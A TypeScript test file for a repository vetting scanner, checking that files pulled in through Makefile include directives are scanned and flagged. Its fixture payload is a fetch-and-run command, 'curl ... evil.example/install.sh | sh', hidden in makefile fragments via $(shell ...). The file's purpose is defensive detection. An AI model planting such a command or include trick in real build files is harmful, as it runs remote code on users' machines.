import { expect, test } from "bun:test";
import { parseRecordedVettingResult } from "../../backend/vetting/scan-result";
import {
  composeScanResult,
  inspectRepository,
  type RepositoryInspection,
  surfacesOf,
} from "./bounded-scan";
import { SCAN_REVIEW_AREAS, type ScannerEvidence } from "./scanners";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

const enc = (text: string) => new TextEncoder().encode(text);

function scan(files: [string, string][]) {
  return inspectRepository({
    files: files.map(([path, text]) => ({ path, bytes: enc(text) })),
  });
}

function classificationsOf(inspection: ReturnType<typeof scan>) {
  const inventory = JSON.parse(new TextDecoder().decode(inspection.inventory));
  return inventory.classifications as { path: string; surfaces: string[] }[];
}

test("a file a makefile includes is reviewed, whatever its name", () => {
  // GNU make reads the named file as makefile text while reading the
  // Makefile, before any target runs, so a $(shell ...) in it executes at
  // parse time. The name `frag.txt` classifies as nothing on its own.
  expect(surfacesOf("frag.txt")).toEqual([]);
  const inspection = scan([
    ["Makefile", "include frag.txt\n\nall:\n\techo ok\n"],
    ["frag.txt", `X := $(shell ${PAYLOAD})\n`],
  ]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path: "frag.txt",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(inspection.downloads).toContain("https://evil.example/install.sh");
  expect(classificationsOf(inspection)).toContainEqual({
    path: "frag.txt",
    surfaces: ["installScripts", "source"],
  });
});

test("a benign included file keeps no finding and joins the inventory", () => {
  const safe = scan([
    ["Makefile", "include frag.txt\n\nall:\n\techo ok\n"],
    ["frag.txt", "GREETING := hello\n\nextra:\n\techo extra\n"],
  ]);
  expect(safe.findings).toEqual([]);
  expect(safe.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  const unsafe = scan([
    ["Makefile", "include frag.txt\n\nall:\n\techo ok\n"],
    ["frag.txt", `X := $(shell ${PAYLOAD})\n`],
  ]);
  expect(unsafe.inventorySha256).not.toBe(safe.inventorySha256);
});

test("included makefiles are followed transitively and from every entry name", () => {
  for (const entry of ["Makefile", "GNUmakefile", "Makefile.am"]) {
    const inspection = scan([
      [entry, "include mid.txt\n\nall:\n\techo ok\n"],
      ["mid.txt", "include frag.txt\n"],
      ["frag.txt", `X := $(shell ${PAYLOAD})\n`],
    ]);
    expect({ entry, findings: inspection.findings }).toEqual({
      entry,
      findings: [
        expect.objectContaining({
          path: "frag.txt",
          category: "unsafe-execution",
          severity: "high",
        }),
      ],
    });
    expect({ entry, coverage: inspection.coverage.installScripts }).toEqual({
      entry,
      coverage: { state: "complete", items: 3 },
    });
  }
});

test("the -include and sinclude forms are followed too", () => {
  for (const directive of ["-include frag.txt", "sinclude frag.txt"]) {
    const inspection = scan([
      ["Makefile", `${directive}\n\nall:\n\techo ok\n`],
      ["frag.txt", `X := $(shell ${PAYLOAD})\n`],
    ]);
    expect({ directive, findings: inspection.findings }).toEqual({
      directive,
      findings: [
        expect.objectContaining({
          path: "frag.txt",
          category: "unsafe-execution",
          severity: "high",
        }),
      ],
    });
  }
});

test("a backslash-continued include names every file on the joined line", () => {
  // GNU make joins a backslash-newline into one logical line before it
  // reads a directive, so both files here are included at read time.
  const inspection = scan([
    ["Makefile", "include frag.txt \\\n  other.txt\n\nall:\n\techo ok\n"],
    ["frag.txt", `X := $(shell ${PAYLOAD})\n`],
    ["other.txt", `X := $(shell ${PAYLOAD})\n`],
  ]);
  expect(inspection.findings.map((finding) => finding.path).sort()).toEqual([
    "frag.txt",
    "other.txt",
  ]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 3,
  });
});

test("an include whose file sits entirely on the continuation line is followed", () => {
  const inspection = scan([
    ["Makefile", "include \\\n  other.txt\n\nall:\n\techo ok\n"],
    ["other.txt", `X := $(shell ${PAYLOAD})\n`],
  ]);
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path: "other.txt",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
});

test("a trailing comment on the continuation line hides no included file", () => {
  // The comment follows the continued file, so the joined logical line
  // still names it. (A backslash before the `#` is not a continuation at
  // all — real make rejects that file instead of including anything.)
  const inspection = scan([
    ["Makefile", "include frag.txt \\\n  other.txt # c\n\nall:\n\techo ok\n"],
    ["frag.txt", `X := $(shell ${PAYLOAD})\n`],
    ["other.txt", `X := $(shell ${PAYLOAD})\n`],
  ]);
  expect(inspection.findings.map((finding) => finding.path).sort()).toEqual([
    "frag.txt",
    "other.txt",
  ]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 3,
  });
});

test("an include in a subdirectory makefile resolves beside that makefile", () => {
  const inspection = scan([
    ["sub/Makefile", "include frag.txt\n\nall:\n\techo ok\n"],
    ["sub/frag.txt", `X := $(shell ${PAYLOAD})\n`],
  ]);
  expect(inspection.findings).toContainEqual(
    expect.objectContaining({
      path: "sub/frag.txt",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
});

test("a variable include specifier names no literal path and is not followed", () => {
  const inspection = scan([
    ["Makefile", "FRAG := frag.txt\ninclude $(FRAG)\n\nall:\n\techo ok\n"],
    ["frag.txt", `X := $(shell ${PAYLOAD})\n`],
  ]);
  expect(inspection.findings).toEqual([]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(classificationsOf(inspection)).not.toContainEqual(
    expect.objectContaining({ path: "frag.txt" }),
  );
});

test("an include of a file outside the acquired tree records no gap", () => {
  // A makefile may include a file the build generates; like the CMake
  // follower, only acquired files join the scan.
  const inspection = scan([
    ["Makefile", "include generated.txt\n\nall:\n\techo ok\n"],
  ]);
  expect(inspection.findings).toEqual([]);
  expect(inspection.visibilityGaps).toEqual([]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
});

const hex64 = "a".repeat(64);

function composedDisposition(inspection: RepositoryInspection) {
  const primary: ScannerEvidence = {
    review: {
      reviewer: "opus",
      provider: "surplus",
      model: "claude-opus-5.5",
      promptPolicyRevision: "slop-scan-review-3",
      inputManifestSha256: inspection.inventorySha256,
      runId: "run-test",
      status: "completed",
      verdict: "no-findings",
      findingCount: 0,
    },
    promptSha256: hex64,
    responseSha256: hex64,
    providerRequestId: null,
    returnedModel: null,
    coverage: Object.fromEntries(
      SCAN_REVIEW_AREAS.map((area) => [area, "complete"]),
    ) as ScannerEvidence["coverage"],
    confidence: 1,
    findings: [],
    usage: null,
    cost: null,
    visibilityGaps: [],
  };
  const { result } = composeScanResult({
    queued: {
      assessmentId: `vet_${"c".repeat(32)}`,
      projectId: "test-proj",
      revision: 1,
      manifestSha256: hex64,
      repository: "owner/repo",
      commitSha: "b".repeat(40),
      templateSha256: hex64,
    },
    inspection,
    policyVersion: "test-policy",
    runId: "scan_test",
    startedAt: "2026-11-11T00:00:00.000Z",
    completedAt: "2026-11-11T00:01:00.000Z",
    primary,
  });
  const recorded = parseRecordedVettingResult(
    JSON.parse(JSON.stringify(result)),
  ) as { disposition?: string };
  return recorded.disposition;
}

test("the payload submission no longer composes to a clean admission", () => {
  const payload = scan([
    ["Makefile", "include frag.txt\n\nall:\n\techo ok\n"],
    ["frag.txt", `X := $(shell ${PAYLOAD})\n`],
  ]);
  expect(composedDisposition(payload)).toBe("incomplete");
  const benign = scan([
    ["Makefile", "include frag.txt\n\nall:\n\techo ok\n"],
    ["frag.txt", "GREETING := hello\n"],
  ]);
  expect(composedDisposition(benign)).toBe("clean");
});

test("an arbitrary file no makefile includes keeps no surface", () => {
  const inspection = scan([
    ["Makefile", "all:\n\techo ok\n"],
    ["frag.txt", `X := $(shell ${PAYLOAD})\n`],
  ]);
  expect(inspection.findings).toEqual([]);
  expect(classificationsOf(inspection)).not.toContainEqual(
    expect.objectContaining({ path: "frag.txt" }),
  );
});
